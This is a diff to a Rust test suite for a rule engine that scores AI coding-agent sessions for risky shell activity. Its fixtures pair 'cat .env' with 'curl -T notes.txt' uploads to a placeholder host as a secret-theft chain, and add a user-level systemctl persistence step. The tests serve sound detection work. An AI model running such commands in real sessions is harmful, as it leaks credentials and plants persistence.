@@ -203,12 +203,12 @@ fn second_review_overlapping_category_sequences_complete_independently() {
         tool("r2", "cat .env", Some("2026-09-17T00:01:00Z")),
         tool(
             "d1",
-            "curl https://example.invalid/a",
+            "curl -T notes.txt https://example.invalid/a",
             Some("2026-09-17T00:02:00Z"),
         ),
         tool(
             "d2",
-            "curl https://example.invalid/b",
+            "curl -T notes.txt https://example.invalid/b",
             Some("2026-09-17T00:03:00Z"),
         ),
     ];
@@ -241,6 +241,130 @@ fn second_review_large_harmless_timed_batch_has_no_sequence_state() {
         actions(&observations).sessions()[0]
             .action_findings()
             .is_empty()
+    );
+}
+
+#[test]
+fn large_shell_credit_batches_preserve_late_detection_and_match_counts() {
+    assert_large_shell_credit_batch(ClientId::Claude, "claude.projects", "Bash", false);
+}
+
+#[test]
+fn large_codex_shell_credit_batch() {
+    assert_large_shell_credit_batch(ClientId::Codex, "codex.sessions", "exec_command", false);
+}
+
+#[test]
+fn large_opencode_shell_credit_batch() {
+    assert_large_shell_credit_batch(ClientId::OpenCode, "opencode.sqlite", "shell", false);
+}
+
+#[test]
+fn large_legacy_codex_shell_credit_batch() {
+    assert_large_shell_credit_batch(ClientId::Codex, "codex.sessions", "shell", true);
+}
+
+fn assert_large_shell_credit_batch(client: ClientId, source_id: &str, name: &str, wrapper: bool) {
+    let observation = |index, command: &str| {
+        let arguments = if name == "exec_command" {
+            serde_json::json!({"cmd":command})
+        } else {
+            serde_json::json!({"command":command})
+        };
+        CanonicalObservationV2::builder(
+            ObservationBody::Tool(
+                ToolObservation::new()
+                    .with_name(name)
+                    .unwrap()
+                    .with_arguments(JsonValue::try_from_source_value(&arguments).unwrap()),
+            ),
+            ObservationStage::ToolRequested,
+            ObservedAt::new("2026-09-18T00:00:00Z").unwrap(),
+            SourceProvenance::new(
+                IngestionMode::SessionStore,
+                if client == ClientId::Claude {
+                    "claude_code"
+                } else {
+                    client.as_str()
+                },
+                source_id,
+                Fidelity::FullNative,
+            )
+            .unwrap()
+            .with_native_id(format!("harmless-{index}"))
+            .unwrap(),
+        )
+        .session_id(CorrelationId::source_reported("synthetic-session").unwrap())
+        .sequence(index)
+        .occurred_at(SourceTimestamp::new("2026-09-17T00:00:00Z").unwrap())
+        .facet(
+            "command.text",
+            SemanticFacet::new(JsonValue::string(command)),
+        )
+        .unwrap()
+        .fact_metadata("command.text", FactMetadata::parsed().unwrap())
+        .fact_metadata("tool.name", FactMetadata::reported().unwrap())
+        .fact_metadata("tool.arguments", FactMetadata::reported().unwrap())
+        .capability_context(
+            CapabilityContext::new()
+                .with_override(CapabilityId::ToolCall, CapabilityAvailability::Supported),
+        )
+        .build()
+        .unwrap()
+    };
+    let command = if wrapper {
+        "bash -lc 'echo ordinary'"
+    } else {
+        "echo ordinary"
+    };
+    let mut observations = (0..4000)
+        .map(|index| observation(index, command))
+        .collect::<Vec<_>>();
+    let rules = telltale_rules::load_default_rule_set().unwrap();
+    let plan = compile_rule_v1(&rules.compatibility_export()).unwrap();
+    let instance = CorrelationId::source_reported("synthetic-source").unwrap();
+    let evaluate = |observations: &[CanonicalObservationV2]| {
+        let input = CanonicalSourceInput {
+            client,
+            source_id,
+            source_instance: Some(&instance),
+            observations,
+        };
+        if wrapper {
+            evaluate_source(input, &plan, None)
+        } else {
+            evaluate_source_with_options(input, &plan, None, &DetailedEvaluationOptions::default())
+        }
+        .unwrap()
+    };
+    let output = evaluate(&observations);
+    let session = &output.sessions()[0];
+    assert_eq!(session.rule_score(), 15, "{source_id}");
+    assert_eq!(session.rule_ids(), ["execution.shell"]);
+    assert!(session.action_findings().is_empty());
+    let shell = session
+        .detectors()
+        .iter()
+        .find(|d| d.detector_id() == "execution.shell")
+        .unwrap();
+    assert_eq!(shell.evaluated_match_count(), 4000);
+    assert!(
+        session.rules.projection().count() <= 3,
+        "only representative shell-credit evidence is retained"
+    );
+    observations.push(observation(
+        4000,
+        "systemctl --user enable synthetic-preview.service",
+    ));
+    let output = evaluate(&observations);
+    assert_eq!(
+        output.sessions()[0].rule_score(),
+        60,
+        "late persistence must still be detected: {source_id}"
+    );
+    assert_eq!(
+        output.sessions()[0].rule_ids(),
+        ["execution.shell", "persistence.shell_profile"]
     );
 }
 
@@ -387,7 +511,7 @@ fn review_ordered_category_chains_and_link_forms() {
         tool("read", "cat .env", Some("2026-09-17T00:00:00Z")),
         tool(
             "download",
-            "curl https://example.invalid/a",
+            "curl -T notes.txt https://example.invalid/a",
             Some("2026-09-17T00:01:00Z"),
         ),
     ];
@@ -493,7 +617,7 @@ fn review_category_chain_order_window_and_independent_repeats() {
         count(&[
             tool(
                 "download",
-                "curl https://example.invalid/a",
+                "curl -T notes.txt https://example.invalid/a",
                 Some("2026-09-17T00:00:00Z")
             ),
             tool("read", "cat .env", Some("2026-09-17T00:01:00Z"))
@@ -502,42 +626,57 @@ fn review_category_chain_order_window_and_independent_repeats() {
     );
     assert_eq!(
         count(&[
-            tool("read", "cat .env", Some("2026-09-17T00:00:00Z")),
+            tool("read", "cat .env", None),
+            tool("idle1", "cargo test", None),
+            tool("idle2", "cargo test", None),
+            tool("idle3", "cargo test", None),
             tool(
-                "download",
-                "curl https://example.invalid/a",
-                Some("2026-09-17T00:15:01Z")
+                "upload",
+                "curl -T notes.txt https://example.invalid/a",
+                None
             )
         ]),
         0
+    );
+    // The link counts calls, not the clock, so a late or untimed step links.
+    assert_eq!(
+        count(&[
+            tool("read", "cat .env", Some("2026-09-17T00:00:00Z")),
+            tool(
+                "download",
+                "curl -T notes.txt https://example.invalid/a",
+                Some("2026-09-17T00:15:01Z")
+            )
+        ]),
+        1
     );
     assert_eq!(
         count(&[
             tool("read", "cat .env", None),
             tool(
-                "download",
-                "curl https://example.invalid/a",
-                Some("2026-09-17T00:01:00Z")
+                "upload",
+                "curl -T notes.txt https://example.invalid/a",
+                None
             )
         ]),
-        0
+        1
     );
     let observations = [
         tool("read1", "cat .env", Some("2026-09-17T00:00:00Z")),
         tool(
             "download1",
-            "curl https://example.invalid/a",
+            "curl -T notes.txt https://example.invalid/a",
             Some("2026-09-17T00:01:00Z"),
         ),
         tool(
             "extra",
-            "curl https://example.invalid/b",
+            "curl -T notes.txt https://example.invalid/b",
             Some("2026-09-17T00:02:00Z"),
         ),
         tool("read2", "cat .env", Some("2026-09-17T00:03:00Z")),
         tool(
             "download2",
-            "curl https://example.invalid/c",
+            "curl -T notes.txt https://example.invalid/c",
             Some("2026-09-17T00:04:00Z"),
         ),
     ];
@@ -550,7 +689,7 @@ fn review_category_chain_order_window_and_independent_repeats() {
     }) {
         assert_eq!(finding.finding_kind(), ActionFindingKind::Correlation);
         assert_eq!(finding.supporting_observation_ids().len(), 2);
-        assert_eq!(finding.promotion_score(), 55); // Completing download 25 + effective chain 30, not the session sum.
+        assert_eq!(finding.promotion_score(), 95); // Completing upload 60 + chain 35, not the session sum.
     }
 }
 
@@ -1193,6 +1332,8 @@ fn assert_credential_projections(
     assert_eq!(output.sessions().len(), 1);
     let session = &output.sessions()[0];
     assert_eq!(session.session_id(), observation.session_id());
+    let shell_match =
+        matches!(observation.body(), ObservationBody::Tool(tool) if tool.name() == Some("Bash"));
     assert_eq!(
         session.rule_ids().iter().any(|rule| rule == id),
         session_match,
@@ -1200,12 +1341,12 @@ fn assert_credential_projections(
     );
     assert_eq!(
         session.rule_score(),
-        if session_match { 30 } else { 0 },
+        u64::from(session_match) * 30 + u64::from(shell_match) * 15,
         "session: {case}"
     );
     assert_eq!(
         session.risk_contributions().len(),
-        usize::from(session_match)
+        usize::from(session_match) + usize::from(shell_match)
     );
     let findings = session.action_findings();
     assert_eq!(findings.len(), usize::from(action_match), "action: {case}");
